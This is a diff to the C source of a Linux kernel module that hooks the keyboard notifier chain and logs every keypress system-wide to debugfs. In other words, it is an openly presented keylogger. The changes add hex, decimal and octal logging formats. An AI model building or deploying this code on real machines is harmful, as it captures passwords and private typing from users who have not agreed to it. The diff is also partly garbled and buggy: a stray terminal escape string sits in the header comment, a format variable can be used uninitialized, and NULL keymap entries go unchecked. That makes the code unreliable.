@@ -1,5 +1,5 @@
 /*
- * A Linux kernel module to grab keycodes and log to debugfs
+1;2802;0c * A Linux kernel module to grab keycodes and log to debugfs
  *
  * Author: Arun Prakash Jana <engineerarun@gmail.com>
  * Copyright (C) 2015 by Arun Prakash Jana <engineerarun@gmail.com>
@@ -24,10 +24,19 @@
 #include <linux/moduleparam.h>
 #include <linux/keyboard.h>
 #include <linux/debugfs.h>
+#include <linux/input.h>
 
-#define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
+#define BUF_LEN (PAGE_SIZE << 2)      /* 16KB buffer (assuming 4KB PAGE_SIZE) */
 
-static int codes;                /* Log type module parameter */
+#define MAX_ENC_LEN sizeof(int) * 8   /* Length of an encoded 'code shift' chunck */
+#define US  0                         /* Type code for US character log */
+#define HEX 1                         /* Type code for hexadecimal log */
+#define DEC 2                         /* Type code for decimal log */
+#define OCT 3                         /* Type code for octal log */
+#define UNI 4                         /* Type code for Unicode log */
+#define SHIFT 1                       /* shift_mask code for shift */
+
+static int codes;                     /* Log type module parameter */
 
 MODULE_LICENSE("GPL v2");
 MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
@@ -35,7 +44,7 @@ MODULE_VERSION("1.4");
 MODULE_DESCRIPTION("Sniff and log keys pressed in the system to debugfs");
 
 module_param(codes, int, 0644);
-MODULE_PARM_DESC(codes, "Flag: 0: US keyboard, 1: keycodes (base10)");
+MODULE_PARM_DESC(codes, "Flag: 0: US keyboard, 1: keycodes (base16) 2: (base10) 3: (base8)");
 
 /* Declarations */
 static struct dentry *file;
@@ -108,17 +117,47 @@ static struct notifier_block keysniffer_blk = {
 	.notifier_call = keysniffer_cb,
 };
 
+void keycode_to_string(int keycode, int shift_mask, char *buffer, int type)
+{
+  const char *pressed_key;
+  const char *format_type;
+  switch (type) {
+  case US:
+    if (keycode >= 0x1 && keycode <= 0x77) {
+      pressed_key = (shift_mask == 1)
+			? us_keymap[keycode][1]
+			: us_keymap[keycode][0];
+      
+      snprintf(buffer, MAX_ENC_LEN, "%s %x", pressed_key, shift_mask);
+    }
+    break;
+  case HEX:
+    format_type = "%x %x";
+    break;
+  case DEC:
+    format_type = "%d %d";
+    break;
+  case OCT:
+    format_type = "%o %o";
+    break;
+  case UNI:
+    format_type = "%x %x";
+  }
+  
+  
+  if (type != US && keycode < KEY_MAX) {
+    snprintf(buffer, MAX_ENC_LEN, format_type, keycode, shift_mask);
+  }
+}
+
 /* Keypress callback */
 int keysniffer_cb(struct notifier_block *nblock,
 		  unsigned long code,
 		  void *_param)
 {
 	size_t len;
-	int max_len = sizeof(int) + 1;
-	char shift_mask[max_len];
-	char key[max_len];
+	char keybuf[MAX_ENC_LEN] = {0};
 	struct keyboard_notifier_param *param = _param;
-	const char *pressed_key;
 
 	pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
 		 code, param->down, param->shift, param->value);
@@ -126,45 +165,21 @@ int keysniffer_cb(struct notifier_block *nblock,
 	if (!(param->down))
 		return NOTIFY_OK;
 
-	if (param->value >= 0x1 && param->value <= 0x77) {
-		pressed_key = param->shift
-			? us_keymap[param->value][1]
-			: us_keymap[param->value][0];
-		if (pressed_key) {
-			int pk_len, mask_len;
+        keycode_to_string(param->value, param->shift, keybuf, codes);
+        len = strlen(keybuf);
 
-			if (codes) {
-				snprintf(key, max_len, "%d", param->value);
-				snprintf(shift_mask, max_len, "%d", param->shift);
-				pressed_key = key;
-				pk_len = strlen(pressed_key);
-				mask_len = strlen(shift_mask);
-				len = pk_len + mask_len + 1;
-			} else
-				len = strlen(pressed_key);
-
-			if ((buf_pos + len) >= BUF_LEN) {
-				memset(keys_buf, 0, BUF_LEN);
-				buf_pos = 0;
-			}
-
-			if (codes) {
-				strncpy(keys_buf + buf_pos, shift_mask, mask_len);
-				buf_pos += mask_len;
-				strncpy(keys_buf + buf_pos, " ", 1);
-				buf_pos++;
-				strncpy(keys_buf + buf_pos, pressed_key, pk_len);
-				buf_pos += pk_len;
-			} else {
-				strncpy(keys_buf + buf_pos, pressed_key, len);
-				buf_pos += len;
-			}
-
-			keys_buf[buf_pos++] = '\n';
-
-			pr_debug("%s\n", pressed_key);
-		}
-	}
+        if (len < 1) 
+          return NOTIFY_OK;
+        
+        if ((buf_pos + len) >= BUF_LEN) {
+          memset(keys_buf, 0, BUF_LEN);
+          buf_pos = 0;
+        }
+	
+        strncpy(keys_buf + buf_pos, keybuf, len);
+        buf_pos += len;
+        keys_buf[buf_pos++] = '\n';
+        pr_debug("%s\n", keybuf);
 
 	return NOTIFY_OK;
 }
